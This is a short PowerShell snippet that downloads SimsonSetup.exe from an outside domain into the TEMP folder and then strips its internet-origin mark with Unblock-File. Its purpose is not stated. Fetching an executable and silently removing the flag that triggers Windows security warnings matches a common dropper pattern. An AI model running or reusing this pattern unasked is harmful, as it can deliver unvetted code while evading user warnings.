$url = "https://burszan.com/simson/SimsonSetup.exe"
$outputPath = "$env:TEMP\SimsonSetup.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath
Unblock-File -Path $outputPath